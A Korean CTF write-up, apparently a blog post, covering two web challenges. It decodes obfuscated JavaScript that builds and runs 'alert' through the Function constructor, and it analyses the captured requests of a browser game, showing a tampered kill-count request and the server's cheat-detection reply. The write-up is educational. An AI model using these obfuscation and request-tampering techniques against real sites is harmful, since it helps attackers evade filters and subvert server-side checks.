<span class="err">𓁄</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span>              <span class="c1">//   "l"</span>
<span class="err">𓂀</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span>              <span class="c1">//   "e"</span>
<span class="err">𓊝</span>                 <span class="c1">//   "r"</span>
<span class="err">𓆣</span>                  <span class="c1">//   "t"</span>

<span class="err">𓁄</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span><span class="o">+</span><span class="err">𓊝</span><span class="o">+</span><span class="err">𓆣</span> <span class="c1">// "alert"</span>

<span class="err">𓂀</span><span class="p">[</span><span class="err">𓆗</span><span class="o">+=</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="p">(</span><span class="err">𓂀</span><span class="p">.</span><span class="err">𓁄</span><span class="o">+</span><span class="err">𓊎</span><span class="p">)[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span>
<span class="err">𓊝</span><span class="o">+</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓆗</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓊝</span><span class="p">][</span><span class="err">𓆗</span><span class="p">](</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span><span class="o">+</span><span class="err">𓊝</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span><span class="dl">"</span><span class="s2">('</span><span class="dl">"</span><span class="o">+</span><span class="err">𓆲</span><span class="o">+</span><span class="dl">"</span><span class="s2"> Flag')</span><span class="dl">"</span><span class="p">)</span>
<span class="c1">// ƒ anonymous(</span>
<span class="c1">// ) {</span>
<span class="c1">// alert('find Flag')</span>
<span class="c1">// }</span>

<span class="err">𓂀</span><span class="p">[</span><span class="err">𓆗</span><span class="p">][</span><span class="err">𓆗</span><span class="p">]</span>
<span class="c1">// ƒ Function() { [native code] }</span>

<span class="err">𓂀</span><span class="p">[</span><span class="err">𓆗</span><span class="p">][</span><span class="err">𓆗</span><span class="p">](</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span><span class="o">+</span><span class="err">𓊝</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span><span class="dl">"</span><span class="s2">('DongDongE')</span><span class="dl">"</span><span class="p">)</span><span class="s2">``</span>
<span class="c1">//ƒ anonymous(</span>
<span class="c1">//) {</span>
<span class="c1">//alert('DongDongE')</span>
<span class="c1">//}</span>
</code></pre></div></div>

<ul>
  <li>위와 같이 alert를 출력하기 위해 각종 문자열 조합으로 Function을 만들고 문자를 조합 한다.</li>
</ul>

<p>위 코드가 그래도 어렵다면 아래 예제에서 간단하게 풀어서 알아보도록 하자.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">𓁄</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span>             <span class="c1">//   "a"       "false" 문자열의 2번째 "a"</span>
<span class="err">𓁄</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span>              <span class="c1">//   "l"       "false" 문자열의 3번째 "ㅣ"</span>
<span class="err">𓂀</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span>              <span class="c1">//   "e"       "true"  문자열의 4번째 "e"</span>
<span class="err">𓊝</span>                 <span class="c1">//   "r"       "true"  문자열의 2번째 "r"</span>
<span class="err">𓆣</span>                  <span class="c1">//   "t"       "true"  문자열의 1번째 "t"</span>
</code></pre></div></div>

<p>위 코드와 같이 “false”와 “true”의 문자열을 하나씩 추출하여 조합하면 “alert”가 되어 alert가 문자열에서 function으로 실행되도록 하는 원리이다.</p>

<p>그러면 위 플래그를 얻기 위해 하나씩 변수를 출력해보면 플래그가 출력된다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">𓆡</span><span class="o">=</span><span class="err">𓆟</span><span class="o">+</span><span class="err">𓄧</span><span class="o">+</span><span class="err">𓆌</span>
<span class="dl">"</span><span class="s2">bob{[object Object]r@on}</span><span class="dl">"</span>
</code></pre></div></div>

<ul class="task-list">
  <li class="task-list-item">
    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Flag is bob{[object Object]r@on}</p>
  </li>
  <li class="task-list-item">
    <p>간혹 플래그값이 자바스크립트의 <strong>“object Object</strong>“가 있는걸 의문 들 수 있지만 하나의 문자를 추출후 조합하기 위해 3-5줄 라인이 더 추가된다. 예를 들어 플래그를 “bob[R@onWhiteHat_1235]” 이런식으로 출력한다고 하면 17글자 이므로 17 * 3 = 51라인이 더 추가되므로 난독화을 풀어나가는 과정에서 난이도가 상승되고 복잡하므로 간단한 플래그를 넣어 난이도를 낮추게 됨.</p>
  </li>
</ul>

<p><br /></p>

<p><br /></p>

<h2 id="fun-fun-game">Fun Fun Game</h2>

<hr />

<p><img src="/assets/bob/bob917.png" alt="/assets/bob/bob917.png" /></p>

<p>[Javasciprt 조작]
문제 사이트에 접속 시 아래와 같은 페이지가 출력되며 게임이 진행되며 게임 플레이 방법은 “<strong>BOB</strong>” 라고 쓰여 있는 우주괴물을 다 제거되어야 Flag가 나오는 문제임.
(본 문제는 <a href="https://www.raoncorp.com/ko/recruit/raonlife">Raon Secure Fun Zone</a>를 모티브로 제작됨)</p>

<p>풀이는 대략 2가지로 생각할 수 있다.
첫 번째는 직접 게임 플레이를 진행 후 전부 제거하여 Flag를 얻거나 (Physical),
두 번째 방법으로는 자바스크립트 로직을 우회하여 게임핵(무적, 스피드)을 제작하여 게임을 진행하거나 또는 게임 진행할 필요 없이 Flag를 얻을 수 있다.</p>

<p><img src="/assets/bob/game_1.gif" alt="/assets/bob/game_1.gif" /></p>

<h3 id="1-문제-로직-파악하기"><strong>1. 문제 로직 파악하기</strong></h3>

<ul>
  <li>문제를 파악하기 위해 게임 한판을 진행한다.</li>
</ul>

<p><img src="/assets/bob/bob918.png" alt="/assets/bob/bob918.png" /></p>

<ul>
  <li>
    <p>60 Point까지 쌓고 “<strong>Game Over</strong>“되어 “<strong>Restart</strong>” 버튼을 누른 상태의  패킷 History 이다.</p>
  </li>
  <li>
    <p>아래 패킷을 통하여 한번 살펴보도록 하자.</p>
  </li>
</ul>

<div class="language-prolog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">POST</span> <span class="o">/</span><span class="ss">check</span><span class="p">.</span><span class="ss">php</span> <span class="nv">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nv">Host</span><span class="o">:</span> <span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Length</span><span class="o">:</span> <span class="m">142</span>
<span class="nv">Accept</span><span class="o">:</span> <span class="o">*/*</span>
<span class="nv">X</span><span class="o">-</span><span class="nv">Requested</span><span class="o">-</span><span class="nv">With</span><span class="o">:</span> <span class="nv">XMLHttpRequest</span>
<span class="nv">User</span><span class="o">-</span><span class="nv">Agent</span><span class="o">:</span> <span class="nv">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nv">Macintosh</span><span class="p">;</span> <span class="nv">Intel</span> <span class="nv">Mac</span> <span class="nv">OS</span> <span class="nv">X</span> <span class="m">10</span><span class="nv">_15_6</span><span class="p">)</span> <span class="nv">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nv">KHTML</span><span class="p">,</span> <span class="ss">like</span> <span class="nv">Gecko</span><span class="p">)</span> <span class="nv">Chrome</span><span class="o">/</span><span class="mf">85.0</span><span class="p">.</span><span class="mf">4183.83</span> <span class="nv">Safari</span><span class="o">/</span><span class="mf">537.36</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Type</span><span class="o">:</span> <span class="ss">application</span><span class="o">/</span><span class="ss">x</span><span class="o">-</span><span class="ss">www</span><span class="o">-</span><span class="ss">form</span><span class="o">-</span><span class="ss">urlencoded</span><span class="p">;</span> <span class="ss">charset</span><span class="o">=</span><span class="nv">UTF</span><span class="o">-</span><span class="m">8</span>
<span class="nv">Origin</span><span class="o">:</span> <span class="ss">http</span><span class="o">://</span><span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span>
<span class="nv">Referer</span><span class="o">:</span> <span class="ss">http</span><span class="o">://</span><span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span><span class="o">/</span>
<span class="nv">Accept</span><span class="o">-</span><span class="nv">Encoding</span><span class="o">:</span> <span class="ss">gzip</span><span class="p">,</span> <span class="ss">deflate</span>
<span class="nv">Accept</span><span class="o">-</span><span class="nv">Language</span><span class="o">:</span> <span class="ss">ko</span><span class="o">-</span><span class="nv">KR</span><span class="p">,</span><span class="ss">ko</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="ss">en</span><span class="o">-</span><span class="nv">US</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="ss">en</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="ss">ja</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.6</span>
<span class="nv">Cookie</span><span class="o">:</span> <span class="nv">PHPSESSID</span><span class="o">=</span><span class="ss">sr6j7mur4mbske04717sbn78k6</span>
<span class="nv">Connection</span><span class="o">:</span> <span class="ss">close</span>

<span class="ss">kills</span><span class="o">=</span><span class="m">15</span><span class="o">&amp;</span><span class="ss">token</span><span class="o">=</span><span class="ss">start</span>
</code></pre></div></div>

<p>[25라인 패킷 - Request]</p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
<span class="nl">Date:</span> <span class="n">Sun</span><span class="p">,</span> <span class="mi">30</span> <span class="n">Aug</span> <span class="mi">2020</span> <span class="mi">01</span><span class="o">:</span><span class="mi">44</span><span class="o">:</span><span class="mi">43</span> <span class="n">GMT</span>
<span class="nl">Server:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.38</span> <span class="p">(</span><span class="n">Debian</span><span class="p">)</span>
<span class="n">X</span><span class="o">-</span><span class="n">Powered</span><span class="o">-</span><span class="n">By</span><span class="o">:</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">7.4.9</span>
<span class="nl">Expires:</span> <span class="n">Thu</span><span class="p">,</span> <span class="mi">19</span> <span class="n">Nov</span> <span class="mi">1981</span> <span class="mi">08</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mi">00</span> <span class="n">GMT</span>
<span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="o">:</span> <span class="n">no</span><span class="o">-</span><span class="n">store</span><span class="p">,</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span><span class="p">,</span> <span class="n">must</span><span class="o">-</span><span class="n">revalidate</span>
<span class="nl">Pragma:</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="o">:</span> <span class="mi">32</span>
<span class="nl">Connection:</span> <span class="n">close</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>

<span class="n">d2e94e4635c240c14e209fab2fa719e7</span>
</code></pre></div></div>

<p>[25라인 패킷 - Response]</p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">POST</span> <span class="o">/</span><span class="n">check</span><span class="p">.</span><span class="n">php</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nl">Host:</span> <span class="n">d0ngd0nge</span><span class="p">.</span><span class="n">xyz</span><span class="o">:</span><span class="mi">1818</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="o">:</span> <span class="mi">169</span>
<span class="nl">Accept:</span> <span class="o">*/*</span>
<span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="n">With</span><span class="o">:</span> <span class="n">XMLHttpRequest</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="o">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span> <span class="n">Intel</span> <span class="n">Mac</span> <span class="n">OS</span> <span class="n">X</span> <span class="mi">10_15_6</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mf">85.0.4183.83</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="nl">Origin:</span> <span class="nl">http:</span><span class="c1">//d0ngd0nge.xyz:1818</span>
<span class="nl">Referer:</span> <span class="nl">http:</span><span class="c1">//d0ngd0nge.xyz:1818/</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="o">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="o">:</span> <span class="n">ko</span><span class="o">-</span><span class="n">KR</span><span class="p">,</span><span class="n">ko</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">ja</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.6</span>
<span class="nl">Cookie:</span> <span class="n">PHPSESSID</span><span class="o">=</span><span class="n">sr6j7mur4mbske04717sbn78k6</span>
<span class="nl">Connection:</span> <span class="n">close</span>

<span class="n">kills</span><span class="o">=</span><span class="mi">15</span><span class="o">&amp;</span><span class="n">token</span><span class="o">=</span><span class="n">d2e94e4635c240c14e209fab2fa719e7</span>
</code></pre></div></div>

<p>[26라인 패킷 - Request]</p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
<span class="nl">Date:</span> <span class="n">Sun</span><span class="p">,</span> <span class="mi">30</span> <span class="n">Aug</span> <span class="mi">2020</span> <span class="mi">01</span><span class="o">:</span><span class="mi">44</span><span class="o">:</span><span class="mi">45</span> <span class="n">GMT</span>
<span class="nl">Server:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.38</span> <span class="p">(</span><span class="n">Debian</span><span class="p">)</span>
<span class="n">X</span><span class="o">-</span><span class="n">Powered</span><span class="o">-</span><span class="n">By</span><span class="o">:</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">7.4.9</span>
<span class="nl">Expires:</span> <span class="n">Thu</span><span class="p">,</span> <span class="mi">19</span> <span class="n">Nov</span> <span class="mi">1981</span> <span class="mi">08</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mi">00</span> <span class="n">GMT</span>
<span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="o">:</span> <span class="n">no</span><span class="o">-</span><span class="n">store</span><span class="p">,</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span><span class="p">,</span> <span class="n">must</span><span class="o">-</span><span class="n">revalidate</span>
<span class="nl">Pragma:</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="o">:</span> <span class="mi">32</span>
<span class="nl">Connection:</span> <span class="n">close</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>

<span class="mi">7</span><span class="n">a115a19ee939868ff2222f8fd765606</span>
</code></pre></div></div>

<p>[26라인 패킷 - Rsponse]</p>

<ul>
  <li>26 라인 ~ 28 라인까지 과정이 같으므로 생략</li>
</ul>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">POST</span> <span class="o">/</span><span class="n">check</span><span class="p">.</span><span class="n">php</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nl">Host:</span> <span class="n">d0ngd0nge</span><span class="p">.</span><span class="n">xyz</span><span class="o">:</span><span class="mi">1818</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="o">:</span> <span class="mi">11</span>
<span class="nl">Accept:</span> <span class="o">*/*</span>
<span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="n">With</span><span class="o">:</span> <span class="n">XMLHttpRequest</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="o">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span> <span class="n">Intel</span> <span class="n">Mac</span> <span class="n">OS</span> <span class="n">X</span> <span class="mi">10_15_6</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mf">85.0.4183.83</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="nl">Origin:</span> <span class="nl">http:</span><span class="c1">//d0ngd0nge.xyz:1818</span>
<span class="nl">Referer:</span> <span class="nl">http:</span><span class="c1">//d0ngd0nge.xyz:1818/</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="o">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="o">:</span> <span class="n">ko</span><span class="o">-</span><span class="n">KR</span><span class="p">,</span><span class="n">ko</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">ja</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.6</span>
<span class="nl">Cookie:</span> <span class="n">PHPSESSID</span><span class="o">=</span><span class="n">sr6j7mur4mbske04717sbn78k6</span>
<span class="nl">Connection:</span> <span class="n">close</span>

<span class="n">check</span><span class="o">=</span><span class="n">start</span>
</code></pre></div></div>

<p>[마지막 29라인 - Reqeust]</p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
<span class="nl">Date:</span> <span class="n">Sun</span><span class="p">,</span> <span class="mi">30</span> <span class="n">Aug</span> <span class="mi">2020</span> <span class="mi">01</span><span class="o">:</span><span class="mi">46</span><span class="o">:</span><span class="mi">52</span> <span class="n">GMT</span>
<span class="nl">Server:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.38</span> <span class="p">(</span><span class="n">Debian</span><span class="p">)</span>
<span class="n">X</span><span class="o">-</span><span class="n">Powered</span><span class="o">-</span><span class="n">By</span><span class="o">:</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">7.4.9</span>
<span class="nl">Expires:</span> <span class="n">Thu</span><span class="p">,</span> <span class="mi">19</span> <span class="n">Nov</span> <span class="mi">1981</span> <span class="mi">08</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mi">00</span> <span class="n">GMT</span>
<span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="o">:</span> <span class="n">no</span><span class="o">-</span><span class="n">store</span><span class="p">,</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span><span class="p">,</span> <span class="n">must</span><span class="o">-</span><span class="n">revalidate</span>
<span class="nl">Pragma:</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="o">:</span> <span class="mi">0</span>
<span class="nl">Connection:</span> <span class="n">close</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
</code></pre></div></div>

<p>[마지막 29라인 - Response]</p>

<ul>
  <li>위와 같이 규칙성을 찾아본다면, 처음 게임 플레이하여 15Kill을 하였을 때 “<strong>kills=15&amp;token=start</strong>” POST 값에 Token을 생략하여 보내지만, 응답으로 “<strong>d2e94e4635c240c14e209fab2fa719e7</strong>” 토큰을 가져오게 됩니다. 두 번째 15Kill 부터 받았던 토큰을 다시 전송하는 규칙을 찾을 수 있다.</li>
  <li>
    <p>마지막으로 게임이 종료되었을 때는 별다른 패킷을 전송하지 않지만 재시작(Restart) 버튼을 클릭하였을 때 “<strong>check=start</strong>” 패킷을 확인할 수 있다.</p>
  </li>
  <li>하지만 “킬수” 조작 및 “토큰”값 조작이 되어 있으면 탐지가 되어 문제를 풀 수 없는 Protect가 설정되어 있다.</li>
</ul>

<p><img src="/assets/bob/bob919.png" alt="/assets/bob/bob919.png" /></p>

<div class="language-prolog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">POST</span> <span class="o">/</span><span class="ss">check</span><span class="p">.</span><span class="ss">php</span> <span class="nv">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nv">Host</span><span class="o">:</span> <span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Length</span><span class="o">:</span> <span class="m">142</span>
<span class="nv">Accept</span><span class="o">:</span> <span class="o">*/*</span>
<span class="nv">X</span><span class="o">-</span><span class="nv">Requested</span><span class="o">-</span><span class="nv">With</span><span class="o">:</span> <span class="nv">XMLHttpRequest</span>
<span class="nv">User</span><span class="o">-</span><span class="nv">Agent</span><span class="o">:</span> <span class="nv">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nv">Macintosh</span><span class="p">;</span> <span class="nv">Intel</span> <span class="nv">Mac</span> <span class="nv">OS</span> <span class="nv">X</span> <span class="m">10</span><span class="nv">_15_6</span><span class="p">)</span> <span class="nv">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nv">KHTML</span><span class="p">,</span> <span class="ss">like</span> <span class="nv">Gecko</span><span class="p">)</span> <span class="nv">Chrome</span><span class="o">/</span><span class="mf">85.0</span><span class="p">.</span><span class="mf">4183.83</span> <span class="nv">Safari</span><span class="o">/</span><span class="mf">537.36</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Type</span><span class="o">:</span> <span class="ss">application</span><span class="o">/</span><span class="ss">x</span><span class="o">-</span><span class="ss">www</span><span class="o">-</span><span class="ss">form</span><span class="o">-</span><span class="ss">urlencoded</span><span class="p">;</span> <span class="ss">charset</span><span class="o">=</span><span class="nv">UTF</span><span class="o">-</span><span class="m">8</span>
<span class="nv">Origin</span><span class="o">:</span> <span class="ss">http</span><span class="o">://</span><span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span>
<span class="nv">Referer</span><span class="o">:</span> <span class="ss">http</span><span class="o">://</span><span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span><span class="o">/</span>
<span class="nv">Accept</span><span class="o">-</span><span class="nv">Encoding</span><span class="o">:</span> <span class="ss">gzip</span><span class="p">,</span> <span class="ss">deflate</span>
<span class="nv">Accept</span><span class="o">-</span><span class="nv">Language</span><span class="o">:</span> <span class="ss">ko</span><span class="o">-</span><span class="nv">KR</span><span class="p">,</span><span class="ss">ko</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="ss">en</span><span class="o">-</span><span class="nv">US</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="ss">en</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="ss">ja</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.6</span>
<span class="nv">Cookie</span><span class="o">:</span> <span class="nv">PHPSESSID</span><span class="o">=</span><span class="ss">sr6j7mur4mbske04717sbn78k6</span>
<span class="nv">Connection</span><span class="o">:</span> <span class="ss">close</span>

<span class="ss">kills</span><span class="o">=</span><span class="m">20</span>
</code></pre></div></div>

<p>[kill 수 조작된 패킷 - Request]</p>

<div class="language-prolog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="m">200</span> <span class="nv">OK</span>
<span class="nv">Date</span><span class="o">:</span> <span class="nv">Sun</span><span class="p">,</span> <span class="m">30</span> <span class="nv">Aug</span> <span class="m">2020</span> <span class="m">02</span><span class="o">:</span><span class="m">22</span><span class="o">:</span><span class="m">26</span> <span class="nv">GMT</span>
<span class="nv">Server</span><span class="o">:</span> <span class="nv">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="m">38</span> <span class="p">(</span><span class="nv">Debian</span><span class="p">)</span>
<span class="nv">X</span><span class="o">-</span><span class="nv">Powered</span><span class="o">-</span><span class="nv">By</span><span class="o">:</span> <span class="nv">PHP</span><span class="o">/</span><span class="mf">7.4</span><span class="p">.</span><span class="m">9</span>
<span class="nv">Expires</span><span class="o">:</span> <span class="nv">Thu</span><span class="p">,</span> <span class="m">19</span> <span class="nv">Nov</span> <span class="m">1981</span> <span class="m">08</span><span class="o">:</span><span class="m">52</span><span class="o">:</span><span class="m">00</span> <span class="nv">GMT</span>
<span class="nv">Cache</span><span class="o">-</span><span class="nv">Control</span><span class="o">:</span> <span class="ss">no</span><span class="o">-</span><span class="ss">store</span><span class="p">,</span> <span class="ss">no</span><span class="o">-</span><span class="ss">cache</span><span class="p">,</span> <span class="ss">must</span><span class="o">-</span><span class="ss">revalidate</span>
<span class="nv">Pragma</span><span class="o">:</span> <span class="ss">no</span><span class="o">-</span><span class="ss">cache</span>
<span class="nv">Vary</span><span class="o">:</span> <span class="nv">Accept</span><span class="o">-</span><span class="nv">Encoding</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Length</span><span class="o">:</span> <span class="m">146</span>
<span class="nv">Connection</span><span class="o">:</span> <span class="ss">close</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Type</span><span class="o">:</span> <span class="ss">text</span><span class="o">/</span><span class="ss">html</span><span class="p">;</span> <span class="ss">charset</span><span class="o">=</span><span class="nv">UTF</span><span class="o">-</span><span class="m">8</span>

<span class="ss">alert</span><span class="p">(</span><span class="ss">'비정상 행위 탐지!! Kills 수가 조작되었습니다. 부정행위로 점수를 초기화 되었습니다.'</span><span class="p">);</span><span class="ss">location</span><span class="p">.</span><span class="ss">reload</span><span class="p">(</span><span class="ss">true</span><span class="p">);</span>
</code></pre></div></div>

<p>[Kill 수 조작된 패킷 - Response]</p>

<ul>
  <li>
